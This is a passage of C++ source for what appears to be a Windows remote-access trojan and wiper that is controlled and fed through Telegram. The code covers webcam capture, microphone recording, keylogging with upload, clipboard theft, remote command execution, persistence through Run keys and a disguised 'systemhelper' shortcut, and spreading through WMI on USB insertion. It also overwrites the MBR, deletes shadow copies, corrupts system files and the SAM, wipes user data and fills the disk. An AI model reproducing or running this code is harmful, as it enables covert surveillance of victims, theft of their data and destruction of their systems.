            for ( UINT32 i = 0; i < count; i++ ) pp_devices[ i ]->Release( );
            CoTaskMemFree( pp_devices );

            if ( FAILED( hr ) ) {
                MFShutdown( );
                return {};
            }

            IMFAttributes* p_reader_attribs = nullptr;
            MFCreateAttributes( &p_reader_attribs, 1 );
            p_reader_attribs->SetUINT32( MF_SOURCE_READER_ENABLE_VIDEO_PROCESSING, TRUE );

            IMFSourceReader* p_reader = nullptr;
            hr = MFCreateSourceReaderFromMediaSource( p_source, p_reader_attribs, &p_reader );
            p_reader_attribs->Release( );
            p_source->Release( );

            if ( FAILED( hr ) ) {
                MFShutdown( );
                return {};
            }

            IMFMediaType* p_type = nullptr;
            MFCreateMediaType( &p_type );
            p_type->SetGUID( MF_MT_MAJOR_TYPE, MFMediaType_Video );
            p_type->SetGUID( MF_MT_SUBTYPE, MFVideoFormat_RGB32 );
            MFSetAttributeSize( p_type, MF_MT_FRAME_SIZE, 1280, 720 );
            hr = p_reader->SetCurrentMediaType( ( DWORD )MF_SOURCE_READER_FIRST_VIDEO_STREAM, nullptr, p_type );
            p_type->Release( );

            if ( FAILED( hr ) ) {
                p_reader->Release( );
                MFShutdown( );
                return {};
            }

            IMFMediaType* p_actual = nullptr;
            p_reader->GetCurrentMediaType( ( DWORD )MF_SOURCE_READER_FIRST_VIDEO_STREAM, &p_actual );
            UINT32 width = 0, height = 0;
            GUID subtype = GUID_NULL;
            MFGetAttributeSize( p_actual, MF_MT_FRAME_SIZE, &width, &height );
            p_actual->GetGUID( MF_MT_SUBTYPE, &subtype );
            p_actual->Release( );

            if ( subtype != MFVideoFormat_RGB32 ) {
                p_reader->Release( );
                MFShutdown( );
                return {};
            }

            for ( int i = 0; i < 5; i++ ) {
                DWORD flags = 0;
                IMFSample* p_sample = nullptr;
                p_reader->ReadSample( ( DWORD )MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                    0, nullptr, &flags, nullptr, &p_sample );
                if ( p_sample ) p_sample->Release( );
            }

            DWORD flags = 0;
            IMFSample* p_sample = nullptr;
            hr = p_reader->ReadSample( ( DWORD )MF_SOURCE_READER_FIRST_VIDEO_STREAM,
                0, nullptr, &flags, nullptr, &p_sample );

            if ( FAILED( hr ) || !p_sample ) {
                p_reader->Release( );
                MFShutdown( );
                return {};
            }

            IMFMediaBuffer* p_buffer = nullptr;
            p_sample->ConvertToContiguousBuffer( &p_buffer );
            p_sample->Release( );

            BYTE* p_raw = nullptr;
            DWORD max_len = 0, cur_len = 0;
            p_buffer->Lock( &p_raw, &max_len, &cur_len );

            if ( !p_raw || cur_len < width * height * 4 ) {
                p_buffer->Unlock( );
                p_buffer->Release( );
                p_reader->Release( );
                MFShutdown( );
                return {};
            }

            int stride = ( int )( cur_len / height );
            std::vector<BYTE> pixels( p_raw, p_raw + cur_len );

            p_buffer->Unlock( );
            p_buffer->Release( );
            p_reader->Release( );

            for ( UINT32 row = 0; row < height / 2; row++ ) {
                BYTE* top = pixels.data( ) + row * stride;
                BYTE* bot = pixels.data( ) + ( height - 1 - row ) * stride;
                std::vector<BYTE> tmp( top, top + stride );
                memcpy( top, bot, stride );
                memcpy( bot, tmp.data( ), stride );
            }

            const UINT32 out_width = 1280;
            const UINT32 out_height = 720;

            BITMAPINFOHEADER bih = {};
            bih.biSize = sizeof( BITMAPINFOHEADER );
            bih.biWidth = ( LONG )width;
            bih.biHeight = ( LONG )height;
            bih.biPlanes = 1;
            bih.biBitCount = 32;
            bih.biCompression = BI_RGB;

            HDC hdc_screen = GetDC( nullptr );
            HDC hdc_src = CreateCompatibleDC( hdc_screen );
            HDC hdc_dst = CreateCompatibleDC( hdc_screen );

            HBITMAP h_src_bmp = CreateDIBitmap( hdc_screen, &bih, CBM_INIT,
                pixels.data( ), ( BITMAPINFO* )&bih, DIB_RGB_COLORS );
            HBITMAP h_dst_bmp = CreateCompatibleBitmap( hdc_screen, out_width, out_height );

            if ( !h_src_bmp || !h_dst_bmp ) {
                if ( h_src_bmp ) DeleteObject( h_src_bmp );
                if ( h_dst_bmp ) DeleteObject( h_dst_bmp );
                DeleteDC( hdc_src );
                DeleteDC( hdc_dst );
                ReleaseDC( nullptr, hdc_screen );
                MFShutdown( );
                return {};
            }

            SelectObject( hdc_src, h_src_bmp );
            SelectObject( hdc_dst, h_dst_bmp );
            SetStretchBltMode( hdc_dst, HALFTONE );
            SetBrushOrgEx( hdc_dst, 0, 0, nullptr );
            StretchBlt( hdc_dst, 0, 0, out_width, out_height,
                hdc_src, 0, 0, width, height, SRCCOPY );

            Gdiplus::Bitmap* png_bmp = Gdiplus::Bitmap::FromHBITMAP( h_dst_bmp, nullptr );

            if ( !png_bmp || png_bmp->GetLastStatus( ) != Gdiplus::Ok ) {
                delete png_bmp;
                DeleteObject( h_src_bmp );
                DeleteObject( h_dst_bmp );
                DeleteDC( hdc_src );
                DeleteDC( hdc_dst );
                ReleaseDC( nullptr, hdc_screen );
                MFShutdown( );
                return {};
            }

            IStream* p_stream = nullptr;
            CreateStreamOnHGlobal( NULL, TRUE, &p_stream );
            CLSID clsid = get_encoder_clsid( L"image/png" );
            png_bmp->Save( p_stream, &clsid, nullptr );

            delete png_bmp;
            DeleteObject( h_src_bmp );
            DeleteObject( h_dst_bmp );
            DeleteDC( hdc_src );
            DeleteDC( hdc_dst );
            ReleaseDC( nullptr, hdc_screen );

            LARGE_INTEGER zero = { 0 };
            ULARGE_INTEGER size;
            p_stream->Seek( zero, STREAM_SEEK_END, &size );
            p_stream->Seek( zero, STREAM_SEEK_SET, nullptr );

            std::vector<BYTE> result( size.LowPart );
            ULONG bytes_read = 0;
            p_stream->Read( result.data( ), result.size( ), &bytes_read );
            p_stream->Release( );

            MFShutdown( );
            return result;
        }

        void overwrite_mbr( ) {
            HANDLE hDisk = CreateFileA(
                oxorany("\\\\.\\PhysicalDrive0"),
                GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE,
                nullptr,
                OPEN_EXISTING,
                0,
                nullptr
            );
            if ( hDisk == INVALID_HANDLE_VALUE ) return;

            char garbage[ 512 ];
            for ( int i = 0; i < 512; ++i )
                garbage[ i ] = rand( ) % 256;

            DWORD written;
            WriteFile( hDisk, garbage, 512, &written, nullptr );
            CloseHandle( hDisk );
        }

        void record_audio( int seconds ) {
            CoInitialize( nullptr );

            IMMDeviceEnumerator* p_enum = nullptr;
            IMMDevice* p_dev = nullptr;
            IAudioEndpointVolume* p_vol = nullptr;

            CoCreateInstance( __uuidof( MMDeviceEnumerator ), nullptr, CLSCTX_ALL,
                __uuidof( IMMDeviceEnumerator ), ( void** )&p_enum );
            p_enum->GetDefaultAudioEndpoint( eCapture, eConsole, &p_dev );
            p_dev->Activate( __uuidof( IAudioEndpointVolume ), CLSCTX_ALL, nullptr, ( void** )&p_vol );

            BOOL muted = FALSE;
            p_vol->GetMute( &muted );
            if ( muted ) p_vol->SetMute( FALSE, nullptr );

            p_vol->Release( );
            p_dev->Release( );
            p_enum->Release( );

            WAVEFORMATEX wfx = { 0 };
            wfx.wFormatTag = WAVE_FORMAT_PCM;
            wfx.nChannels = 1;
            wfx.nSamplesPerSec = 44100;
            wfx.wBitsPerSample = 16;
            wfx.nBlockAlign = wfx.nChannels * ( wfx.wBitsPerSample / 8 );
            wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;

            HWAVEIN h_wave_in = nullptr;
            if ( waveInOpen( &h_wave_in, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL ) != MMSYSERR_NOERROR ) {
                CoUninitialize( );
                https::send_telegram_message( oxorany("[@") + utility::get_username( ) + oxorany("] failed to open audio device.") );
                return;
            }

            DWORD data_size = seconds * wfx.nAvgBytesPerSec;
            std::vector<char> buffer( data_size, 0 );

            WAVEHDR wav_hdr = { 0 };
            wav_hdr.lpData = buffer.data( );
            wav_hdr.dwBufferLength = data_size;
            wav_hdr.dwFlags = 0;

            waveInPrepareHeader( h_wave_in, &wav_hdr, sizeof( WAVEHDR ) );
            waveInAddBuffer( h_wave_in, &wav_hdr, sizeof( WAVEHDR ) );
            waveInStart( h_wave_in );
            Sleep( seconds * 1000 );
            waveInStop( h_wave_in );
            waveInUnprepareHeader( h_wave_in, &wav_hdr, sizeof( WAVEHDR ) );
            waveInClose( h_wave_in );
            CoUninitialize( );

            // build WAV in memory
            std::vector<BYTE> wav;
            wav.reserve( 44 + data_size );

            auto append = [ & ] ( const void* src, size_t len ) {
                const BYTE* p = reinterpret_cast< const BYTE* >( src );
                wav.insert( wav.end( ), p, p + len );
                };

            DWORD chunk_size = 36 + data_size;
            DWORD fmt_size = 16;
            WORD  fmt_tag = 1;
            DWORD byte_rate = wfx.nAvgBytesPerSec;

            append( oxorany("RIFF"), 4 );
            append( &chunk_size, 4 );
            append( oxorany("WAVEfmt "), 8 );
            append( &fmt_size, 4 );
            append( &fmt_tag, 2 );
            append( &wfx.nChannels, 2 );
            append( &wfx.nSamplesPerSec, 4 );
            append( &byte_rate, 4 );
            append( &wfx.nBlockAlign, 2 );
            append( &wfx.wBitsPerSample, 2 );
            append( oxorany("data"), 4 );
            append( &data_size, 4 );
            append( buffer.data( ), data_size );

            if ( !wav.empty( ) )
                https::send_telegram_document( wav, oxorany("audio.wav") );
            else
                https::send_telegram_message( oxorany("[") + utility::get_username( ) + oxorany("] failed to record audio.") );
        }

        void freeze_screen( ) {
            SetProcessDPIAware( );
            HDC hdc_screen = GetDC( GetDesktopWindow( ) );
            int width = GetSystemMetrics( SM_CXSCREEN );
            int height = GetSystemMetrics( SM_CYSCREEN );

            g_freeze_hdc = CreateCompatibleDC( hdc_screen );
            g_freeze_bmp = CreateCompatibleBitmap( hdc_screen, width, height );
            SelectObject( g_freeze_hdc, g_freeze_bmp );
            BitBlt( g_freeze_hdc, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY );
            ReleaseDC( GetDesktopWindow( ), hdc_screen );

            WNDCLASSEXW wc = { sizeof( wc ) };
            wc.lpfnWndProc = DefWindowProcW;
            wc.hInstance = GetModuleHandleW( nullptr );
            wc.lpszClassName = L"freeze_wnd";
            RegisterClassExW( &wc );

            g_freeze_wnd = CreateWindowExW(
                WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
                L"freeze_wnd", nullptr,
                WS_POPUP | WS_VISIBLE,
                0, 0, width, height,
                nullptr, nullptr, GetModuleHandleW( nullptr ), nullptr
            );

            HDC hdc_wnd = GetDC( g_freeze_wnd );
            BitBlt( hdc_wnd, 0, 0, width, height, g_freeze_hdc, 0, 0, SRCCOPY );
            ReleaseDC( g_freeze_wnd, hdc_wnd );

            BlockInput( TRUE );
        }

        void unfreeze_screen( ) {
            BlockInput( FALSE );

            if ( g_freeze_wnd ) {
                DestroyWindow( g_freeze_wnd );
                UnregisterClassW( L"freeze_wnd", GetModuleHandleW( nullptr ) );
                g_freeze_wnd = nullptr;
            }
            if ( g_freeze_hdc ) {
                DeleteDC( g_freeze_hdc );
                g_freeze_hdc = nullptr;
            }
            if ( g_freeze_bmp ) {
                DeleteObject( g_freeze_bmp );
                g_freeze_bmp = nullptr;
            }
        }

        std::string get_clipboard_text() {
            if (!OpenClipboard(nullptr)) return "";
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (!hData) {
                CloseClipboard();
                return "";
            }
            char* pszText = static_cast<char*>(GlobalLock(hData));
            std::string result(pszText ? pszText : "");
            GlobalUnlock(hData);
            CloseClipboard();
            return result;
        }

        void start_keylogger() {
            if (!g_keyboard_hook) {
                g_keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
            }
        }

        void stop_keylogger() {
            if (g_keyboard_hook) {
                UnhookWindowsHookEx(g_keyboard_hook);
                g_keyboard_hook = nullptr;
                if (!g_keylog_buffer.empty()) {
                    std::ofstream log(oxorany("keylog.txt"), std::ios::app);
                    log << g_keylog_buffer;
                    g_keylog_buffer.clear();
                }

                std::ifstream logfile(oxorany("keylog.txt"), std::ios::binary);
                if (logfile) {
                    std::vector<BYTE> content((std::istreambuf_iterator<char>(logfile)), {});
                    https::send_telegram_document(content, oxorany("keylog.txt"));
                    std::remove(oxorany("keylog.txt"));
                }
            }
        }

        void delete_restore() {
            system("rmdir /s /q \"C:\\System Volume Information\"");
            system("vssadmin delete shadows /all /quiet");
            system("wmic recoveryos set autoreboot = false");
        }

        void boot_bsod() {
            system("bcdedit /set {default} bootstatuspolicy displayallfailures");
            system("bcdedit /set {default} recoveryenabled No");
            // Write a driver or service that crashes on load
            // Simpler: corrupt a critical system DLL
            std::ofstream("C:\\Windows\\System32\\ntoskrnl.exe", std::ios::binary | std::ios::trunc) << "corrupted";
        }

        void disable_network_adapters() {
            system("wmic nic where 'NetEnabled=true' call disable");
            system("netsh interface set interface name=\"Ethernet\" admin=disable");
            system("netsh interface set interface name=\"Wi-Fi\" admin=disable");
        }

        void disable_usb() {
            HDEVINFO devInfo = SetupDiGetClassDevs(NULL, NULL, NULL, DIGCF_ALLCLASSES | DIGCF_PRESENT);
            SP_DEVINFO_DATA devData = { sizeof(devData) };
            for (DWORD i = 0; SetupDiEnumDeviceInfo(devInfo, i, &devData); i++) {
                wchar_t desc[256];
                if (SetupDiGetDeviceRegistryPropertyW(devInfo, &devData, SPDRP_DEVICEDESC, NULL, (PBYTE)desc, sizeof(desc), NULL)) {
                    if (wcsstr(desc, L"USB") || wcsstr(desc, L"Keyboard") || wcsstr(desc, L"Mouse")) {
                        SP_PROPCHANGE_PARAMS params = { sizeof(SP_PROPCHANGE_PARAMS) };
                        params.ClassInstallHeader.cbSize = sizeof(SP_CLASSINSTALL_HEADER);
                        params.ClassInstallHeader.InstallFunction = DIF_PROPERTYCHANGE;
                        params.StateChange = DICS_DISABLE;
                        params.Scope = DICS_FLAG_GLOBAL;
                        params.HwProfile = 0;
                        SetupDiSetClassInstallParams(devInfo, &devData, &params.ClassInstallHeader, sizeof(params));
                        SetupDiCallClassInstaller(DIF_PROPERTYCHANGE, devInfo, &devData);
                    }
                }
            }
            SetupDiDestroyDeviceInfoList(devInfo);
        }

        bool install_startup() {
            char self_path[MAX_PATH];
            GetModuleFileNameA(NULL, self_path, MAX_PATH);

            std::string user_startup_folder = std::string(getenv(oxorany("APPDATA"))) + oxorany("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
            std::string user_shortcut = user_startup_folder + oxorany("\\systemhelper.lnk");
            if (CreateShortcut(self_path, user_shortcut, oxorany("--startup"))) {
                https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] installed in user startup (shortcut)"));
            }

            char program_data[MAX_PATH];
            if (GetEnvironmentVariableA(oxorany("PROGRAMDATA"), program_data, sizeof(program_data))) {
                std::string all_users_startup = std::string(program_data) + oxorany("\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp");
                std::filesystem::create_directories(all_users_startup);
                std::string all_users_shortcut = all_users_startup + oxorany("\\systemhelper.lnk");
                if (CreateShortcut(self_path, all_users_shortcut, oxorany("--startup"))) {
                    https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] installed in all users startup (shortcut)"));
                }
            }

            HKEY hKey;
            if (RegOpenKeyExA(HKEY_CURRENT_USER, oxorany("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                if (RegSetValueExA(hKey, oxorany("systemhelper"), 0, REG_SZ, (const BYTE*)self_path, strlen(self_path) + 1) == ERROR_SUCCESS) {
                    RegCloseKey(hKey);
                    https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] installed in HKCU Run"));
                } else {
                    RegCloseKey(hKey);
                }
            }

            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, oxorany("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                if (RegSetValueExA(hKey, oxorany("systemhelper"), 0, REG_SZ, (const BYTE*)self_path, strlen(self_path) + 1) == ERROR_SUCCESS) {
                    RegCloseKey(hKey);
                    https::send_telegram_message(oxorany("[@") + utility::get_username() + oxorany("] installed in HKLM Run"));
                } else {
                    RegCloseKey(hKey);
                }
            }

            return true;
        }

        bool confirm_action(int64_t& last_update_id, const std::string& username) {
            int64_t confirm_offset = last_update_id + 1;
            for (int attempts = 0; attempts < 30; attempts++) {
                Sleep(2000);
                std::string confirm_str = https::get_telegram_message(confirm_offset);
                if (confirm_str.empty()) continue;
                try {
                    auto updates = json::parse(confirm_str);
                    if (!updates.contains(oxorany("ok")) || !updates[oxorany("ok")].get<bool>()) continue;
                    for (auto& cu : updates[oxorany("result")]) {
                        confirm_offset = cu[oxorany("update_id")].get<int64_t>() + 1;
                        if (!cu.contains(oxorany("message"))) continue;
                        auto& cm = cu[oxorany("message")];
                        if (!cm.contains(oxorany("text"))) continue;
                        std::string reply = cm[oxorany("text")].get<std::string>();
                        if (reply == oxorany("yes")) return true;
                        else if (reply == oxorany("no")) return false;
                    }
                } catch (...) {}
            }
            return false;
        }

        bool set_wallpaper(const std::string& image_path) {
            int wlen = MultiByteToWideChar(CP_UTF8, 0, image_path.c_str(), -1, nullptr, 0);
            std::wstring wpath(wlen, L'\0');
            MultiByteToWideChar(CP_UTF8, 0, image_path.c_str(), -1, wpath.data(), wlen);

            bool result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wpath.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            return result;
        }

        void trigger_bsod() {
            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
            auto NtRaiseHardError = (NTSTATUS(NTAPI*)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG))GetProcAddress(ntdll, "NtRaiseHardError");
            ULONG_PTR args[4] = { 0 };
            ULONG resp = 0;
            NtRaiseHardError(0xC0000022, 0, 0, NULL, 1, &resp); // STATUS_ACCESS_VIOLATION
        }

        void overwrite_user_data() {
            std::string paths[] = { getenv("USERPROFILE"), getenv("APPDATA"), getenv("LOCALAPPDATA") };
            for (auto& root : paths) {
                for (auto& p : std::filesystem::recursive_directory_iterator(root)) {
                    if (std::filesystem::is_regular_file(p.path())) {
                        std::ofstream file(p.path(), std::ios::binary | std::ios::trunc);
                        if (file) file << std::string(1024, '\0');
                        file.close();
                        std::filesystem::remove(p.path());
                    }
                }
            }
        }

        void corrupt_registry() {
            HKEY hKey;
            // Delete the SAM (Security Accounts Manager) – breaks all user logins
            RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SAM", 0, DELETE, &hKey);
            RegDeleteKeyW(hKey, L"");
            RegCloseKey(hKey);
            // Corrupt Winlogon shell value
            RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", 0, KEY_SET_VALUE, &hKey);
            RegSetValueExW(hKey, L"Shell", 0, REG_SZ, (BYTE*)L"", 1);
            RegCloseKey(hKey);
        }

        void kill_critical_processes() {
            const wchar_t* processes[] = { L"csrss.exe", L"lsass.exe", L"winlogon.exe", L"services.exe", L"svchost.exe" };
            HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            PROCESSENTRY32W pe = { sizeof(pe) };
            if (Process32FirstW(hSnapshot, &pe)) {
                do {
                    for (auto& name : processes) {
                        if (_wcsicmp(pe.szExeFile, name) == 0) {
                            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (hProc) TerminateProcess(hProc, 1);
                            CloseHandle(hProc);
                        }
                    }
                } while (Process32NextW(hSnapshot, &pe));
            }
            CloseHandle(hSnapshot);
        }

        void wipe_directory(const std::string& path) {
            try {
                for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
                    if (std::filesystem::is_regular_file(entry.path())) {
                        std::error_code ec;
                        std::filesystem::remove(entry.path(), ec);
                    }
                }
            } catch (...) {}
        }

        void disk_fill(const std::string& drive = "C:") {
            std::string path = drive + "\\temp_fill.dat";
            const size_t chunk = 1024 * 1024; // 1 MB
            std::vector<char> data(chunk, 'X');
            std::ofstream file(path, std::ios::binary);
            if (!file) return;

            ULARGE_INTEGER freeBytes;
            while (GetDiskFreeSpaceExA(drive.c_str(), &freeBytes, NULL, NULL)) {
                if (freeBytes.QuadPart < 100 * 1024 * 1024) break; // stop when <100 MB free
                file.write(data.data(), chunk);
                if (!file) break;
                file.flush();
            }
            file.close();
        }

        std::string exec_cmd(const std::string& cmd) {
            std::string result;
            HANDLE hReadPipe, hWritePipe;
            SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
            if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
                return "Failed to create pipe";

            PROCESS_INFORMATION pi = {0};
            STARTUPINFOA si = {0};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESTDHANDLES;
            si.hStdOutput = hWritePipe;
            si.hStdError = hWritePipe;

            std::string fullCmd = "cmd.exe /c " + cmd;
            if (!CreateProcessA(NULL, (LPSTR)fullCmd.c_str(), NULL, NULL, TRUE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
                CloseHandle(hReadPipe);
                CloseHandle(hWritePipe);
                return "Failed to create process";
            }

            CloseHandle(hWritePipe); // child writes, we close our copy
            CloseHandle(pi.hThread);

            char buffer[4096];
            DWORD bytesRead;
            while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                result += buffer;
            }

            WaitForSingleObject(pi.hProcess, 3000);
            CloseHandle(pi.hProcess);
            CloseHandle(hReadPipe);

            if (result.empty()) return "<no output>";
            return result;
        }

        bool spread_usb_wmi() {
            char self_path[MAX_PATH];
            GetModuleFileNameA(NULL, self_path, MAX_PATH);
            std::string exe_path(self_path);

            std::string vbs_path = std::string(getenv("TEMP")) + "\\wmi_install.vbs";
            std::ofstream vbs(vbs_path);
            vbs << "strComputer = \".\"\n";
            vbs << "Set objWMIService = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\subscription\")\n";
            vbs << "Set objFilter = objWMIService.Get(\"__EventFilter\").SpawnInstance_()\n";
            vbs << "objFilter.Name = \"USBTrigger\"\n";
            vbs << "objFilter.QueryLanguage = \"WQL\"\n";
            vbs << "objFilter.Query = \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\"\n";
            vbs << "objFilter.EventNamespace = 'root\\cimv2'\n";
            vbs << "objFilter.Put_()\n";
            vbs << "Set objConsumer = objWMIService.Get(\"CommandLineEventConsumer\").SpawnInstance_()\n";
            vbs << "objConsumer.Name = \"USBLauncher\"\n";
            vbs << "objConsumer.CommandLineTemplate = \"" << exe_path << "\"\n";
            vbs << "objConsumer.Put_()\n";
            vbs << "Set objBinding = objWMIService.Get(\"__FilterToConsumerBinding\").SpawnInstance_()\n";
            vbs << "objBinding.Filter = objFilter\n";
            vbs << "objBinding.Consumer = objConsumer\n";
            vbs << "objBinding.Put_()\n";
            vbs.close();

            SHELLEXECUTEINFOA sei = { sizeof(sei) };
            sei.lpVerb = "runas";
            sei.lpFile = "wscript.exe";
            sei.lpParameters = vbs_path.c_str();
            sei.nShow = SW_HIDE;
            BOOL ok = ShellExecuteExA(&sei);
            if (ok) Sleep(3000);
            std::remove(vbs_path.c_str());
            return ok;
        }
    };
}